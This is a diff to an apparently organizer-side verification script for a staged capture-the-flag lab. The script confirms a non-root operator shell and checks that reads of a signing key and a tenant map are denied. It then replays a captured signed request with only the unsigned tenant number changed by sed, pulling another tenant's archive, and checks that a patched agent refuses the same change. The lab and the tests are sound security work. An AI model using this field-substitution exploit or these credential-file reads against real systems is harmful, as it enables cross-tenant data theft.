@@ -84,25 +84,27 @@ def operator_recovery(client, tenant, installation, receipt):
 
 
 def guest(service, command):
-    """Run a command as the non-root operator inside the given guest, over the
-    operator SSH the terminal uses — the same capability the player holds once in
-    the Stage 06 shell."""
+    """Organizer-only: run a command as the guest operator over the VM
+    container's loopback SSH. Used solely for independent assertions (the
+    patched fixture, which no player terminal reaches) — never for a player
+    step. Player steps go through `Terminal`."""
     ssh = ("umask 077; cp /var/lib/aether-vm/operator_ed25519 /tmp/opkey; chmod 600 /tmp/opkey; "
            "exec ssh -i /tmp/opkey -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "
-           "-o ConnectTimeout=5 -p 2222 operator@127.0.0.1 " + shlex.quote(command))
+           "-o ConnectTimeout=5 -o LogLevel=ERROR -p 2222 operator@127.0.0.1 " + shlex.quote(command))
     result = subprocess.run(legacy.worker.COMPOSE + ["exec", "-T", service, "sh", "-c", ssh],
-                            cwd=ROOT, capture_output=True, text=True)
+                            cwd=ROOT, capture_output=True, text=True, check=True, timeout=20)
     return result.stdout
 
 
 def agent_archive(service, envelope):
+    """Organizer-only independent assertion against a guest's agent."""
     body = shlex.quote(json.dumps(envelope))
     out = guest(service, "curl -s --max-time 5 -H 'Content-Type: application/json' "
                 "-d " + body + " http://127.0.0.1:8080/v1/legacy/archive")
     try:
         return json.loads(out)
-    except json.JSONDecodeError:
-        return {"_raw": out}
+    except json.JSONDecodeError as error:
+        raise AssertionError(f"agent returned invalid JSON: {out!r}") from error
 
 
 GUEST_MISSING = ("full-chain verification requires the Linux guest, but the terminal returned {status}. "
@@ -342,65 +344,47 @@ def run(web=False):
             denied.close()
             require(status == 403, f"terminal accepted a foreign origin: {status}")
 
-            terminal, status, buffered = vmverify.connect_websocket(cookie, ORIGIN)
-            if status == 503:
-                # Full-chain verification must never silently convert a missing
-                # guest into a skip and still report success (Requirement 3).
-                terminal.close()
-                raise AssertionError(
-                    "full-chain verification requires the Linux guest, but the terminal returned 503. "
-                    "Stages 06, 07 and 08 were NOT executed. Start the guest with `make vm-up` and re-run, "
-                    "or run `make web-chain-verify` for the application-only (Stages 01-05) scope. "
-                    "Refusing to report full-chain success.")
-            require(status == 101, f"system_admin terminal handshake returned {status}, expected 101")
+            # Stages 06-08 run entirely inside this one player terminal session.
+            terminal = Terminal(cookie)
             try:
-                # Marker preceded by the command OUTPUT (uid 1000, group operator)
-                # so the PTY echo of the typed command cannot satisfy the match.
-                vmverify.send_websocket_text(terminal, "id -u; id -nG; echo BV_CHAIN_SHELL_OK\r")
-                output, deadline = "", time.monotonic() + 25
-                while "\n1000\noperator\nBV_CHAIN_SHELL_OK\n" not in output.replace("\r", ""):
-                    opcode, payload, buffered = vmverify.read_frame(terminal, buffered)
-                    if opcode == 8:
-                        raise AssertionError("terminal closed before the shell responded")
-                    if opcode == 1:
-                        output += payload.decode("utf-8", "replace")
-                    require(time.monotonic() < deadline, "terminal shell timed out")
+                out = terminal.ok("id -u; id -nG")
+                require(out.split()[:2] == ["1000", "operator"], f"terminal reached an unexpected identity: {out!r}")
+                print("PASS: challenge stage 06 — the elevated player opens the restricted non-root "
+                      "Linux operator shell through the terminal, with no SQL grant.", flush=True)
+
+                # ---- Stage 07: native service investigation (in the player's shell) ----
+                build = terminal.ok(f"curl -sS --max-time 5 {AGENT}/v1/build")
+                require("legacy-envelope/1" in build, f"agent build endpoint unexpected: {build!r}")
+                envelope = json.loads(terminal.ok(f"cat {CAPTURE}"))
+                require(envelope["tenant_uuid"] == NORTH and envelope["principal"] == "svc:aether-reporting"
+                        and envelope["legacy_tenant_no"] == 4101,
+                        "captured envelope is not the North Works reporting request")
+                # The operator holds a captured message, not the signing key or map.
+                for secret in ("/etc/aether-agent/worker.key", "/etc/aether-agent/tenant-map.csv"):
+                    status, out = terminal.run(f"cat {secret}")
+                    require(status != 0 and "denied" in out.lower(), f"operator could read {secret}: {out!r}")
+                print("PASS: challenge stage 07 — operator discovers the agent protocol and the retained "
+                      "worker-signed capture, without the signing key or tenant map.", flush=True)
+
+                # ---- Stage 08: agent identity binding (number substitution) ----
+                post = f"curl -sS --max-time 5 -H 'Content-Type: application/json' --data-binary @- {AGENT}/v1/legacy/archive"
+                legit = json.loads(terminal.ok(f"cat {CAPTURE} | {post}"))
+                require(legit.get("resolved_legacy_tenant_no") == 4101 and "north-works" in json.dumps(legit),
+                        f"captured envelope did not resolve the North Works archive: {legit}")
+                # Substitute only the unsigned number; the signature is untouched.
+                confused = json.loads(terminal.ok(
+                    f"sed 's/\"legacy_tenant_no\": 4101/\"legacy_tenant_no\": 4102/' {CAPTURE} | {post}"))
+                require(confused.get("resolved_legacy_tenant_no") == 4102
+                        and "harbor" in json.dumps(confused).lower(),
+                        f"number substitution did not cross tenants: {confused}")
             finally:
                 terminal.close()
-            print("PASS: challenge stage 06 — the elevated player opens the restricted non-root "
-                  "Linux operator shell through the terminal, with no SQL grant.", flush=True)
-
-            # ---- Stage 07: native service investigation (in the operator shell) ----
-            build = guest("aether-linux-vm", "curl -s --max-time 5 http://127.0.0.1:8080/v1/build")
-            require("legacy-envelope/1" in build, f"agent build endpoint unexpected: {build!r}")
-            capture = guest("aether-linux-vm", "cat /var/lib/aether-migration/last-archive-request.json")
-            require(capture.strip(), "retained archive-request capture not found in the guest")
-            envelope = json.loads(capture)
-            require(envelope["tenant_uuid"] == NORTH and envelope["principal"] == "svc:aether-reporting"
-                    and envelope["legacy_tenant_no"] == 4101,
-                    "captured envelope is not the North Works reporting request")
-            # The operator holds a captured message, not the signing key or map.
-            key_read = guest("aether-linux-vm", "cat /etc/aether-agent/worker.key 2>&1 || true")
-            require("worker.key" not in key_read or "denied" in key_read.lower() or key_read.strip() == "",
-                    f"operator could read the worker signing key: {key_read!r}")
-            print("PASS: challenge stage 07 — operator discovers the agent protocol and the retained "
-                  "worker-signed capture, without the signing key or tenant map.", flush=True)
-
-            # ---- Stage 08: agent identity binding (number substitution) ----
-            legit = agent_archive("aether-linux-vm", envelope)
-            require(legit.get("resolved_legacy_tenant_no") == 4101 and "north-works" in json.dumps(legit),
-                    f"captured envelope did not resolve the North Works archive: {legit}")
-            forged = dict(envelope)
-            forged["legacy_tenant_no"] = 4102  # substitute only the unsigned number
-            confused = agent_archive("aether-linux-vm", forged)
-            require(confused.get("resolved_legacy_tenant_no") == 4102
-                    and "harbor" in json.dumps(confused).lower(),
-                    f"number substitution did not cross tenants: {confused}")
             print("PASS: challenge stage 08 — substituting only legacy_tenant_no on a valid "
                   "worker signature returns a foreign bounded archive (identity confusion).", flush=True)
 
-            # Patched VM regression: the patched agent signs the number and the
-            # timestamp, so the same substitution (and a stale replay) are refused.
+            # Patched VM regression (organizer independent assertion — no player
+            # terminal reaches this fixture): the patched agent signs the number and the
+            # timestamp, so the same substitution is refused (freshness is tested independently).
             # The patched guest is mandatory for the full chain — a missing fixture
             # is a hard failure, not a skip.
             p_capture = guest("aether-linux-vm-patched", "cat /var/lib/aether-migration/last-archive-request.json")
@@ -411,7 +395,7 @@ def run(web=False):
             p_forged = dict(p_env)
             p_forged["legacy_tenant_no"] = 4102
             refused = agent_archive("aether-linux-vm-patched", p_forged)
-            require("resolved_legacy_tenant_no" not in refused,
+            require(refused.get("error") == "service signature rejected",
                     f"patched agent accepted a substituted number: {refused}")
             print("PASS: patched stage 08 — the patched agent refuses the number substitution "
                   "(signature covers the number and timestamp).", flush=True)
